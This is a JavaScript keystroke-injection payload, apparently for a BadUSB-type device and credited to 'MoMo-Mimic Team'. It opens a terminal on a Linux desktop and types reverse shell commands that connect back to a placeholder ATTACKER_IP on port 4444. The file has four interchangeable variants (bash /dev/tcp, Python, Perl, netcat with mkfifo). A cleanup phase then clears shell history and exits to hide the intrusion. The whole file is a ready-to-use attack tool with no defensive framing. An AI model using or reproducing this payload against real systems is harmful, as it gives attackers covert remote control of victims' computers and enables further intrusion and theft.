// ═══════════════════════════════════════════════════════════════════════════
// Payload: linux_reverse_shell.js
// Target:  Linux (GUI - GNOME/KDE/XFCE)
// Time:    ~3 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Bash reverse shell - Hedef sisteme uzaktan erişim
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var LHOST = "ATTACKER_IP";   // Listener IP
var LPORT = "4444";          // Listener port

// Shell tipi: "bash" | "python" | "perl" | "nc"
var SHELL_TYPE = "bash";

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
// GNOME/Ubuntu default
press("CTRL-ALT-t");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: REVERSE SHELL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘

if (SHELL_TYPE == "bash") {
    // Bash /dev/tcp method
    type("bash -c 'bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1' &");
    press("ENTER");
}

if (SHELL_TYPE == "python") {
    // Python reverse shell
    type("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
    type("s.connect((\"" + LHOST + "\"," + LPORT + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);");
    type("os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &");
    press("ENTER");
}

if (SHELL_TYPE == "perl") {
    // Perl reverse shell
    type("perl -e 'use Socket;$i=\"" + LHOST + "\";$p=" + LPORT + ";");
    type("socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));");
    type("if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");");
    type("open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};' &");
    press("ENTER");
}

if (SHELL_TYPE == "nc") {
    // Netcat reverse shell (eğer -e destekliyorsa)
    type("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc " + LHOST + " " + LPORT + " >/tmp/f &");
    press("ENTER");
}

delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("disown 2>/dev/null; history -c; exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ TERMINAL SHORTCUTS BY DE                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
// GNOME: CTRL+ALT+T
// KDE:   CTRL+ALT+T veya Konsole
// XFCE:  CTRL+ALT+T veya xfce4-terminal
// i3:    $mod+Enter
// 
// Alternatif: ALT+F2 → xterm/gnome-terminal/konsole

